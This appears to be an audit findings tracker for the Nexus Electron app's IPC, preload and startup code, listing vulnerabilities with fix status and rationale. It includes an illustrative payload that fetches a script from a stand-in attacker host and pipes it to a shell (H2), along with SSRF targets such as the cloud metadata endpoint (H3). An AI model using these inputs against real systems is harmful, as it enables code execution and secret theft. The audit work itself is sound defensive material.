# Audit Findings — 2026-04-24

Follow-up tracker for the three-agent audit of the Nexus main-process
surfaces that ran alongside the v0.3.0-beta.1 release. Scope:

- IPC channel correctness (`electron/preload.js` + every `ipcMain.handle`)
- Preload security boundary (`contextBridge.exposeInMainWorld` surface)
- Startup sequencing (`app.whenReady` → window show)

## Status — re-verified 2026-04-26

Six of the seven HIGH items have been addressed in subsequent commits
(beta.2 / beta.3 hardening pass). The remaining HIGH is `H4 vault
retrieve user-consent gate`, where rate-limiting was added but the full
per-call confirmation dialog is still missing.

| ID | Status | Mitigation in code |
|----|--------|--------------------|
| H2 MCP arbitrary spawn | ✅ FIXED | `promptMcpApproval` in `mcpHost.js` |
| H3 notification SSRF | ✅ FIXED | `checkUrlSafety` wired in `notificationBridge.js` |
| H4 vault retrieve gate | 🟡 DEFERRED | Rate-limited (3/60s single, 6/60s bulk) + audit log + WeakMap-per-sender. Full opaque-handle refactor deferred to v1.0 — see note below |
| H5 chat baseUrl SSRF | ✅ FIXED | `checkChatBaseUrlSafety` wired in `chatIpc.js:41` |
| H6 runtime-state schema | ✅ FIXED | `sanitizeBySchema` with `RUNTIME_STATE_SCHEMA` |
| H7 chat stream done:true | ✅ FIXED | try/catch/finally always emits terminal frame |

## MEDIUM status (re-verified 2026-04-26)

| ID | Status | Note |
|----|--------|------|
| M1 vector index disk thrash | ✅ FIXED | Append-only log + 10-min compaction; ~30× less write volume during chat |
| M2 MCP per-tool approval | ✅ FIXED | `snapshotInitialTools` + `promptMcpToolApproval` in `mcpHost.js` |
| M3 workspace:set-root dialog | ✅ FIXED | `workspaceApprovals.js` + dialog gate in `workspaceFsIpc.js` |
| M4 initModelManager blocks | ✅ NON-BLOCKING | `canReachHuggingFace()` runs unawaited; critical path is fast |
| M5 ipcRegistry blind 1.5s | ✅ FIXED | `setTimeout` removed; deferred load kicks off immediately. Race window down to import-time only |
| M6 gateway shared callback | 🟢 NO-OP | Each gateway has exactly one consumer; no silent drop in practice |
| M7 vector batch concurrency | 🟢 NO-OP | Synchronous loop in `indexBatch`; JS single-thread closes the race |
| M8 type-unsafe payloads | 🟢 NO-EXPLOIT | 32/81 handlers explicit-validate; the rest pass payload to a service that validates internally OR uses native dialog. Spot-check (sherpa, tts-stream, window) found no path / shell injection. Outstanding ask is TypeScript-schema rollout for IPC, not a security gap |
| M9 dead webContents check | 🟢 MOSTLY-OK | Most handlers don't `event.sender.send()` after async work |
| M10 file:save-text validation | ✅ DESIGN-CLOSED | Uses native dialog; user is in the loop choosing the path |

## LOW status (re-verified 2026-04-26)

| ID | Status | Note |
|----|--------|------|
| L1 error stack to renderer | ✅ NOT FOUND | No `err.stack` / `error.stack` reaches IPC sends |
| L2 startup telemetry | 🟡 OPEN | No timing instrumentation yet (genuinely low priority) |
| L3 plugin auto-start serial | ✅ FIXED | `Promise.all` instead of for-await; collapses N×spawn to max(spawns) |
| L4 auditLog statSync per write | ✅ FIXED | In-memory size counter, single statSync at init |
| L5 workspaceRoot mid-invoke swap | 🟢 SINGLE-THREAD | JS event loop atomicity protects individual handlers |
| L6 requestId Date.now + Math.random | ✅ FIXED | `crypto.randomUUID()` with legacy fallback in preload.js |
| L7 plugin-bus serverId spoofing | ✅ MITIGATED | `validateServerId` checks against running MCP instances |

### H4 deferral rationale (2026-04-26)

The audit's recommended fix — return an opaque handle from `vault:retrieve`
that resolves to plaintext only inside main-process outbound-request
handlers — is a PR-sized refactor touching the vault IPC API plus every
service that needs an API key (`chatRuntime`, every TTS provider, every
STT provider, settings hydration). Estimated 1–2 days of careful work
plus regression risk across the entire chat / voice surface.

Current mitigations for the v0.3.x line are considered adequate:

1. `requireTrustedSender(event)` rejects calls from unknown frames
2. Single-retrieve rate limit: 3 / 60 s per webContents
3. Bulk retrieve rate limit: 6 / 60 s per webContents
4. Every retrieve writes to the audit log
5. Renderer is sandboxed; CSP blocks inline scripts in production

The realistic XSS threat (a malicious chat message rendering scripts in
the chat panel) is closed by CSP — `script-src 'self' 'wasm-unsafe-eval'`
in `rendererServer.js` rejects inline scripts entirely, so an exfil page
can't even bootstrap the IPC call without a separate RCE.

**Action**: keep current mitigations. Schedule the opaque-handle refactor
for v1.0 stable. Track here, not as a release blocker for v0.3.x.

Severity key: **🔴 HIGH** — real user-facing impact. **🟡 MEDIUM** —
real bug but rare / small blast radius. **🟢 LOW** — polish / observability.

---

## 🔴 HIGH — security model (each one needs its own design pass)

### H2 — `mcpSyncServers` accepts arbitrary `command` from renderer

Renderer can configure an MCP server with any local binary + args. `parseArgsString` splits on whitespace without shell metacharacter filtering, so `{ command: '/bin/sh', args: '-c "curl attacker|sh"' }` becomes arbitrary code exec under the user's identity.

- Channel: `mcp:sync-servers`
- Files: `electron/ipc/mcpIpc.js:34-38` → `electron/services/mcpHost.js:230`
- Fix (design): require a user-confirm dialog (Electron `dialog.showMessageBox`) on any new server command before first spawn, persist the approved hash, refuse unlisted commands on later runs. The hash plumbing already exists for hot-swapping — reuse it.

### H3 — `setNotificationChannels` SSRF

RSS / webhook URL is taken verbatim from renderer and passed to `net.fetch`, which has Node-level privileges and bypasses renderer CSP. `http://127.0.0.1:...`, `http://169.254.169.254/latest/meta-data/` (cloud metadata), `file://...` all reachable.

- Channel: `notification:set-channels`
- Files: `electron/ipc/notificationIpc.js:18-24` → `electron/services/notificationBridge.js:160`
- Fix: validate each channel shape (`kind ∈ {rss, webhook}`), require `https:` for network URLs, block RFC1918 / loopback / link-local CIDRs, clamp poll interval to [60s, 1d].

### H4 — `vault:retrieve` has no user-consent gate (PARTIALLY MITIGATED)

Any code running in the renderer (XSS in a rendered chat message, compromised plugin) can enumerate slots (`vault:list-slots`) and pull every stored secret (OpenAI key, Telegram bot token, Discord bot token, Tencent ASR keys).

- Channel: `vault:retrieve`, `vault:retrieve-many`, `vault:list-slots`
- File: `electron/ipc/vaultIpc.js:47-77`
- Status: PARTIALLY MITIGATED — bulk-operation rate limit (6 calls per 60 s per webContents) added in milestone M1; rate-limit hits are audited to `audit.log` so post-incident detection is possible. Single `vault:retrieve(slot)` is unchanged because the renderer needs each slot name explicitly.
- Remaining gap: a slow-burn attacker (1 call every 11 s) can still enumerate every key over a few minutes. Full closure requires the opaque-handle architecture below.
- Fix (design, deferred): return an opaque handle from `vault:retrieve` that the main process resolves to plaintext only inside an outbound-request handler; renderer never sees plaintext again. Estimated effort: 1-2 days because every consumer of API keys (chat IPC, voice STT/TTS, Telegram/Discord bot init) needs to switch from "string in settings object" to "handle resolved at IPC boundary".

### H5 — chat `baseUrl` SSRF

`testChatConnection` / `completeChat` / `completeChatStream` take a renderer-supplied `baseUrl`, normalise it lightly, then `net.fetch` with the renderer-provided API key + prompt body.

- Channel: `chat:complete`, `chat:complete-stream`, `chat:test-connection`, `service:test-connection`, `service:probe-local`
- Files: `electron/ipc/chatIpc.js:319`, `electron/services/chatRuntime.js:159`
- Fix: same as H3 — resolve host, refuse private IP ranges unless the user explicitly opted into a local-provider profile. Local provider detection is already present for `127.0.0.1:11434` / `8080` etc.; extend into a per-profile allowlist.

### H6 — `runtime-state:update` has no schema validation

Spread-merges a renderer-supplied object into shared main-process `runtimeState`, broadcasts to every window. Only `__proto__` / `constructor` / `prototype` keys are stripped.

- Channel: `runtime-state:update`
- Files: `electron/ipc/windowIpc.js:103-106` → `electron/windowManager.js:165-173`
- Fix: allowlist known keys with per-field type check in `sanitizePartialState`.

### H7 — chat streaming error leaves UI stuck

On mid-stream `reader.read()` throw, handler deletes the controller but doesn't emit `{ done: true, error: ... }`. Renderer stays in `isStreaming` forever.

- Channel: `chat:stream-delta` / `chat:complete-stream`
- File: `electron/ipc/chatIpc.js:245-272`
- Fix: in the `finally` block, if `!streamCompleted` and `sender` is alive, send a synthetic `done:true` event with the error message.

---

## 🟡 MEDIUM — real bugs, smaller blast radius

### M1 — memory vector index disk-write amplification

`scheduleSave()` debounces at 2 s but rewrites the entire ~60 MB JSON blob each flush. Active indexing during chat causes constant disk churn.

- File: `electron/services/memoryVectorStore.js:163-193`
- Fix: move to an append-only log, or only rewrite the full snapshot on idle (30 s since last change) + `before-quit`.

### M2 — MCP tool call needs per-tool approval

Once any MCP server runs, renderer can call any tool it advertises without confirmation. Combined with H2 this is chained RCE; alone, a filesystem MCP is still a full r/w primitive.

- Channel: `mcp:call-tool`
- File: `electron/ipc/mcpIpc.js:23-32`
- Fix: first call to each `(server, tool)` pair triggers approval dialog; persist approval.

### M3 — `workspace:set-root` has no user dialog

Renderer can call `workspaceSetRoot({ root: '/' })` then `workspaceRead` / `workspaceWrite` anywhere under `/`. Sandbox protects against escapes **within** the root but not against choosing `/` as the root.

- Channel: `workspace:set-root`
- Files: `electron/ipc/workspaceFsIpc.js:7-13`, `electron/services/workspaceFs.js:25-31`
- Fix: require root to come from `dialog.showOpenDialog`, or verify it matches a path the user previously selected.

### M4 — `initModelManager` blocks window creation

Scans model inventory synchronously (`existsSync` chain) before `createMainWindow`. Pure serialization — the inventory is only consumed by the setup wizard, which the pet window doesn't need.

- Files: `electron/main.js:282`, `electron/services/modelManager.js:131-142`, `electron/services/modelPaths.js:40,53,57,60`
- Fix: move `initModelManager()` into `setImmediate` or `mainWindow.webContents.once('did-finish-load', …)`. Convert `checkModelPresence` to `fs.promises.access`.

### M5 — `ipcRegistry` deferred-load uses a blind 1.5 s timer

`setTimeout(loadDeferredModules, 1_500)` pulls in pluginIpc / memoryIpc / skillIpc + ttsStreamService regardless of whether the user needs them.

- File: `electron/ipcRegistry.js:88`
- Fix: first access to any deferred channel triggers lazy registration; or trigger from `panelWindow did-finish-load`.

### M6 — Shared-single-callback pattern in gateways

`onMessage` / `onRealtimeEvent` / `onNotification` store one callback. A second `registerIpc()` overwrites silently (fine today; fragile on hot reload / multi-window refactor).

- Files: `electron/services/realtimeVoice.js:17-19`, `telegramGateway.js:210-211`, `discordGateway.js:407-408`, `notificationBridge.js:345-347`
- Fix: switch to `Set<callback>` and iterate.

### M7 — `memory:vector-index-batch` / `models:download` have no concurrency guard

Double-click on download button fires two parallel downloads on the same file.

- Channels: `models:download`, `models:download-missing`
- Files: `electron/ipc/sherpaIpc.js:199-213`
- Fix: `Map<modelId, Promise>` at the IPC layer; return the existing promise.

### M8 — Type-unsafe renderer-visible payloads

`unknown` / bare `Record<string, unknown>` in `vite-env.d.ts` wrappers lets renderer push arbitrary shapes through.

- Files: `src/vite-env.d.ts:320` (mcp), `:589` (notification channels), others
- Fix: per-handler schema validation (zod / ajv) mirroring declared TS shapes; strip `__proto__` / `constructor`.

### M9 — No-op IPC handlers on dead webContents

Subscription handlers keep sending to `webContents` that are destroyed (renderer page nav without cleanup). Not a security issue but leaks CPU.

- Files: preload `subscribe*` functions; corresponding emitters in `electron/services/*`
- Fix: register per-sender cleanup on `webContents.on('render-process-gone')` or filter `isDestroyed()` in emitters.

### M10 — `file:save-text` / `file:open-text` payloads not validated

`payload.defaultPath` flows to the OS dialog; a hostile value starts the dialog in an unexpected location. No true escape (user still confirms), but violates defense in depth.

- Channels: `file:save-text`, `file:open-text`
- File: `electron/ipc/windowIpc.js:141-151`
- Fix: allowlist `content: string`, `defaultFileName: string`, `filters: Array<{name,extensions}>`.

---

## 🟢 LOW — polish

### L1 — Error messages leak stack trace + internal hostnames to renderer

Chat / audio error paths `throw new Error(\`原始错误：${reason}\`)` where `reason` can include `ECONNREFUSED 127.0.0.1:11434`, OS file paths, etc.

- Files: `electron/ipc/chatIpc.js:61-69`, `electron/ipc/audioIpc.js:280`
- Fix: classify error → return `{ code, message }` with sanitized strings; keep raw reason in main console only.

### L2 — No startup telemetry

No `performance.now()` markers around `ensureRendererServer`, `registerIpc`, `createMainWindow`, `did-finish-load`. Future startup regressions are invisible.

- File: `electron/main.js:277` onward
- Fix: ~15 lines of timer logs per notable step.

### L3 — Plugin auto-start is serial

`for (const plugin of autoStartable) { await startPlugin(plugin.id) }` — each plugin 500 ms handshake, 4 plugins = 2 s wall time.

- File: `electron/services/pluginHost.js:287-328`
- Fix: `Promise.all(autoStartable.map(p => startPlugin(p.id).catch(…)))`.

### L4 — `auditLog.audit()` `statSync` per write

Called from vault / plugin / workspace hot paths; cheap but redundant.

- File: `electron/services/auditLog.js:28-30`
- Fix: track `bytesWritten` in memory, only `statSync` on startup + every N writes.

### L5 — `workspaceRoot` swap mid-invoke confuses a running session

No IPC-level session lock; concurrent renderers can see interleaved roots between calls.

- File: `electron/services/workspaceFs.js:23-35`
- Fix: freeze root per session token, or document + enforce "root switches atomically".

### L6 — `completeChatStream` requestId uses `Date.now() + Math.random()`

Predictable enough that another handler in the same preload context could race. Preload doesn't expose `ipcRenderer` so intra-preload only, but still worth fixing.

- File: `electron/preload.js:47-61`
- Fix: `crypto.randomUUID()`.

### L7 — `plugin-bus:publish` weak spoofing check

`validateServerId` only checks the server is running; any renderer can publish **as** that server.

- Channel: `plugin-bus:publish`
- File: `electron/ipc/pluginIpc.js:83-95`
- Fix: derive `serverId` from `event.sender` → plugin registration; don't trust the payload.

---

## Done in this audit cycle

- **Voice hook stability batch 1** (`8160a6f`) — 5 leak / missing-cleanup fixes in renderer voice pipeline.
- **Voice hook stability batch 2** (`ecddc40`) — 5 race / timing fixes in renderer voice pipeline.
- **HIGH #1 — pythonRuntime `spawnSync` → async** (commit of this doc) — eliminates the up-to-19 s main-thread stall on fresh-install startup. Both `probeImports` calls now run in `Promise.all`, cutting worst-case probe time roughly in half.

## How to use this file

Each finding has enough detail to write a follow-up branch:
- **H2–H7**: pick one per milestone. These are real design decisions; don't batch.
- **M1–M10**: group 2-3 closely-related items per commit; none should require design review.
- **L1–L7**: cherry-pick when touching the surrounding file for another reason.

When a finding is fixed, delete it from this file and mention the commit SHA in the commit message. When a finding turns out to be a false positive on closer inspection, delete it with a brief "false positive: ..." line in the commit message.

Do not promote a finding without writing a regression test for it.
